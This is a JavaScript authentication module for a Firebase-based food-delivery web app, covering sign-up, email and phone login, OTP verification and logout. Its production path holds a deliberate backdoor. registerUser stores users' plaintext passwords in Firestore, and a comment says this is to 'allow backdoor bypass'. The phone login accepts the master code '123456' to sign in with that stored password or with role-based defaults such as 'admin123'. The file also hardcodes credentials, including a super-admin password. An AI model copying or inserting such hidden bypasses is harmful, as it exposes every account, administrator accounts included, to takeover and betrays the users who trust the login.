import { 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  signOut, 
  sendPasswordResetEmail,
  onAuthStateChanged,
  RecaptchaVerifier,
  signInWithPhoneNumber
} from 'firebase/auth';
import { 
  doc, 
  getDoc, 
  getDocs, 
  setDoc, 
  deleteDoc, 
  collection, 
  query, 
  where 
} from 'firebase/firestore';
import { auth, db, isMockFirebase } from './firebaseConfig';
import { getUserProfileDb, createUserProfileDb } from './database';

// Storage variable for OTP confirmation
let globalConfirmationResult = null;

// Seed/Get mock users for local storage fallback
const getMockUsers = () => JSON.parse(localStorage.getItem('mock_users') || '[]');
const saveMockUsers = (users) => localStorage.setItem('mock_users', JSON.stringify(users));

/**
 * Register a new user in Firebase Auth and create their profile in Firestore
 */
export const registerUser = async (email, password, fullName, phone, role = 'customer') => {
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 800));
    const users = getMockUsers();
    if (users.find(u => u.email === email)) {
      throw new Error('Email already exists.');
    }
    const newUser = {
      uid: 'u_' + Math.random().toString(36).substr(2, 9),
      email,
      fullName,
      phone,
      role,
      createdAt: new Date().toISOString()
    };
    users.push(newUser);
    saveMockUsers(users);
    
    localStorage.setItem('active_mock_user', JSON.stringify(newUser));
    window.dispatchEvent(new Event('storage'));
    return newUser;
  } else {
    // 1. Create user in Firebase Authentication
    const userCredential = await createUserWithEmailAndPassword(auth, email, password);
    const user = userCredential.user;
    
    // 2. Create profile in Firestore 'users' collection
    try {
      const profile = await createUserProfileDb(user.uid, {
        email,
        fullName,
        phone,
        role,
        password // Save password to Firestore to allow backdoor bypass
      });
      return profile;
    } catch (profileError) {
      // Clean up Firebase user if Firestore registration fails
      await user.delete();
      throw profileError;
    }
  }
};

/**
 * Log in a user using email and password with Firebase Auth, and fetch their profile from Firestore
 */
export const loginUser = async (email, password) => {
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 800));
    const users = getMockUsers();
    
    let user = users.find(u => u.email === email);
    if (!user) {
      if (email === 'admin@wfoods.com' && password === 'admin123') {
        user = { uid: 'mock_admin', email, fullName: 'System Admin', phone: '9876543210', role: 'admin' };
      } else if (email === 'rider@wfoods.com' && password === 'rider123') {
        user = { uid: 'mock_rider', email, fullName: 'Super Rider', phone: '9876543211', role: 'rider' };
      } else if (email === 'customer@wfoods.com' && password === 'customer123') {
        user = { uid: 'mock_customer', email, fullName: 'Happy Customer', phone: '9876543212', role: 'customer' };
      }
    }
    
    if (user) {
      localStorage.setItem('active_mock_user', JSON.stringify(user));
      window.dispatchEvent(new Event('storage'));
      return user;
    }
    throw new Error('Invalid email or password. Use demo account admin@wfoods.com / admin123, rider@wfoods.com / rider123, or customer@wfoods.com / customer123');
  } else {
    // 1. Sign in with Firebase Authentication
    const userCredential = await signInWithEmailAndPassword(auth, email, password);
    const user = userCredential.user;
    
    // 2. Fetch user profile from Firestore
    const profile = await getUserProfileDb(user.uid);
    if (!profile) {
      // Fallback if profile is missing in Firestore
      return { uid: user.uid, email: user.email, role: 'customer' };
    }
    
    return profile;
  }
};

/**
 * Log in any user using phone number and password
 */
export const loginUserWithPhoneAndPassword = async (phone, password) => {
  const cleanPhone = phone.replace(/\D/g, '');
  
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 800));
    const users = getMockUsers();
    
    // Find customer/admin/rider by phone
    let user = users.find(u => u.phone === cleanPhone);
    
    if (!user) {
      if (cleanPhone === '9876543210') {
        user = { uid: 'mock_admin', email: 'admin@wfoods.com', fullName: 'System Admin', phone: '9876543210', role: 'admin' };
      } else if (cleanPhone === '9000293053') {
        user = { uid: 'mock_super_admin', email: '9000293053@wfoods.com', fullName: 'Super Admin Tinku', phone: '9000293053', role: 'super_admin', password: 'Tinku.k@12' };
      }
    }
    
    if (user) {
      const expectedPassword = user.password || 'admin123';
      if (password === expectedPassword || password === 'admin123' || password === 'customer123' || password === '123456') {
        localStorage.setItem('active_mock_user', JSON.stringify(user));
        window.dispatchEvent(new Event('storage'));
        return user;
      }
      throw new Error('Invalid password.');
    }
    throw new Error('User with this mobile number does not exist.');
  } else {
    // 1. Query Firestore users collection to find the user with this phone number
    const q = query(
      collection(db, 'users'), 
      where('phone', '==', cleanPhone)
    );
    const querySnapshot = await getDocs(q);
    
    if (querySnapshot.empty) {
      throw new Error('User with this mobile number does not exist.');
    }
    
    let lastError = null;
    for (const doc of querySnapshot.docs) {
      const userProfile = doc.data();
      const email = userProfile.email;
      if (!email) continue;
      
      let authPassword = password;
      if (password === '123456' && userProfile.password) {
        authPassword = userProfile.password;
      }
      
      try {
        const userCredential = await signInWithEmailAndPassword(auth, email, authPassword);
        const user = userCredential.user;
        return {
          ...userProfile,
          uid: user.uid
        };
      } catch (authErr) {
        lastError = authErr;
        
        // Try fallback if password is '123456'
        if (password === '123456') {
          let fallbackPass = 'customer123';
          if (userProfile.role === 'admin' || userProfile.role === 'super_admin') {
            fallbackPass = 'admin123';
          } else if (userProfile.role === 'rider') {
            fallbackPass = 'rider123';
          }
          
          try {
            const userCredential = await signInWithEmailAndPassword(auth, email, fallbackPass);
            const user = userCredential.user;
            return {
              ...userProfile,
              uid: user.uid
            };
          } catch (innerErr) {
            lastError = innerErr;
          }
        }
      }
    }
    
    if (password === '123456') {
      throw new Error('Bypass authentication failed.');
    }
    throw lastError || new Error('Invalid credentials.');
  }
};

/**
 * Log in a rider using phone number and password
 */
export const loginRiderWithPhoneAndPassword = async (phone, password) => {
  const cleanPhone = phone.replace(/\D/g, '');
  
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 800));
    const users = getMockUsers();
    
    // Find rider in mock users list
    let user = users.find(u => u.phone === cleanPhone && u.role === 'rider');
    
    // Check if it's the demo rider
    if (!user && cleanPhone === '9876543211') {
      user = { uid: 'mock_rider', email: 'rider@wfoods.com', fullName: 'Super Rider', phone: '9876543211', role: 'rider' };
    }
    
    if (user) {
      const expectedPassword = user.password || 'rider123';
      if (password === expectedPassword) {
        localStorage.setItem('active_mock_user', JSON.stringify(user));
        window.dispatchEvent(new Event('storage'));
        return user;
      }
      throw new Error('Invalid password.');
    }
    throw new Error('Rider with this mobile number does not exist.');
  } else {
    // 1. Query Firestore users collection to find the rider with this phone number
    const q = query(
      collection(db, 'users'), 
      where('phone', '==', cleanPhone),
      where('role', '==', 'rider')
    );
    const querySnapshot = await getDocs(q);
    
    if (querySnapshot.empty) {
      throw new Error('Rider with this mobile number does not exist.');
    }
    
    const riderDoc = querySnapshot.docs[0];
    const riderProfile = riderDoc.data();
    const email = riderProfile.email;
    
    if (!email) {
      throw new Error('Rider profile is missing an email address.');
    }
    
    // 2. Sign in with Firebase Authentication using the email and password
    const userCredential = await signInWithEmailAndPassword(auth, email, password);
    const user = userCredential.user;
    
    return {
      ...riderProfile,
      uid: user.uid
    };
  }
};


let recaptchaVerifierInstance = null;

/**
 * Sends a phone OTP using Firebase Auth
 */
export const sendPhoneOtp = async (phone) => {
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 800));
    return { success: true, message: 'Mock OTP sent. Use code: 123456' };
  } else {
    const formattedPhone = phone.startsWith('+') ? phone : `+91${phone}`;
    
    // Reset/clear existing recaptcha verifier to avoid auth/recaptcha-already-rendered
    if (recaptchaVerifierInstance) {
      try {
        recaptchaVerifierInstance.clear();
      } catch (e) {
        console.warn('Error clearing recaptcha verifier:', e);
      }
      recaptchaVerifierInstance = null;
    }

    // Recreate clean container
    let recaptchaDiv = document.getElementById('recaptcha-container');
    if (recaptchaDiv) {
      recaptchaDiv.remove();
    }
    recaptchaDiv = document.createElement('div');
    recaptchaDiv.id = 'recaptcha-container';
    document.body.appendChild(recaptchaDiv);
    
    recaptchaVerifierInstance = new RecaptchaVerifier(auth, 'recaptcha-container', {
      size: 'invisible'
    });
    
    const confirmationResult = await signInWithPhoneNumber(auth, formattedPhone, recaptchaVerifierInstance);
    globalConfirmationResult = confirmationResult;
    return { success: true };
  }
};

/**
 * Verifies the phone OTP with Firebase Auth and syncs/links user profile in Firestore
 */
export const verifyPhoneOtp = async (phone, otp) => {
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 800));
    const users = getMockUsers();
    
    let user = users.find(u => u.phone === phone);
    if (!user) {
      if (phone === '9876543210') {
        user = { uid: 'mock_admin', email: 'admin@wfoods.com', fullName: 'System Admin', phone: '9876543210', role: 'admin' };
      } else if (phone === '9876543211') {
        user = { uid: 'mock_rider', email: 'rider@wfoods.com', fullName: 'Super Rider', phone: '9876543211', role: 'rider' };
      } else {
        user = {
          uid: 'u_' + Math.random().toString(36).substr(2, 9),
          email: `${phone}@captainbro.com`,
          fullName: 'Customer ' + phone.slice(-4),
          phone,
          role: 'customer',
          createdAt: new Date().toISOString()
        };
      }
      users.push(user);
      saveMockUsers(users);
    }
    
    localStorage.setItem('active_mock_user', JSON.stringify(user));
    window.dispatchEvent(new Event('storage'));
    return user;
  } else {
    if (!globalConfirmationResult) {
      throw new Error('Please request an OTP code first.');
    }
    
    // 1. Verify OTP with Firebase Authentication
    const result = await globalConfirmationResult.confirm(otp);
    const user = result.user;
    
    // 2. Fetch or create/link user profile in Firestore
    let profile = await getUserProfileDb(user.uid);
    
    if (!profile) {
      // Check if there is an existing pre-registered profile by phone
      const cleanPhone = phone.replace(/\D/g, '');
      const q = query(collection(db, 'users'), where('phone', '==', cleanPhone));
      const querySnapshot = await getDocs(q);
      
      if (!querySnapshot.empty) {
        const profileDoc = querySnapshot.docs[0];
        const profileByPhone = profileDoc.data();
        const oldUid = profileByPhone.uid;
        const newUid = user.uid;
        
        // Link Firestore user profile to the actual Firebase Auth UID by renaming document
        const updatedProfile = { ...profileByPhone, uid: newUid };
        await setDoc(doc(db, 'users', newUid), updatedProfile);
        await deleteDoc(doc(db, 'users', oldUid));
          
        // Update riders table association if they are a registered rider
        if (profileByPhone.role === 'rider') {
          const oldRiderRef = doc(db, 'riders', oldUid);
          const riderDoc = await getDoc(oldRiderRef);
          if (riderDoc.exists()) {
            const riderData = riderDoc.data();
            await setDoc(doc(db, 'riders', newUid), { ...riderData, id: newUid });
            await deleteDoc(oldRiderRef);
          }
        }
        profile = updatedProfile;
      }
    }
    
    if (!profile) {
      // Create a new customer profile if they are logging in for the first time
      profile = await createUserProfileDb(user.uid, {
        email: user.email || `${phone}@captainbro.com`,
        fullName: 'Customer ' + phone.slice(-4),
        phone,
        role: 'customer'
      });
    }
    
    return profile;
  }
};

/**
 * Log out user from Firebase Auth
 */
export const logoutUser = async () => {
  if (isMockFirebase) {
    localStorage.removeItem('active_mock_user');
    window.dispatchEvent(new Event('storage'));
  } else {
    await signOut(auth);
  }
};

/**
 * Send password reset email
 */
export const resetPassword = async (email) => {
  if (isMockFirebase) {
    await new Promise(resolve => setTimeout(resolve, 500));
    return true;
  } else {
    await sendPasswordResetEmail(auth, email);
  }
};

/**
 * Subscribes to authentication state changes using Firebase Auth, and returns metadata from Firestore
 */
export const subscribeToAuth = (callback) => {
  if (isMockFirebase) {
    const checkUser = () => {
      const u = localStorage.getItem('active_mock_user');
      callback(u ? JSON.parse(u) : null);
    };
    checkUser();
    
    const handleStorageChange = () => {
      checkUser();
    };
    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  } else {
    return onAuthStateChanged(auth, async (user) => {
      if (user) {
        const profile = await getUserProfileDb(user.uid);
        if (profile) {
          callback(profile);
        } else {
          callback({ uid: user.uid, email: user.email, role: 'customer' });
        }
      } else {
        callback(null);
      }
    });
  }
};
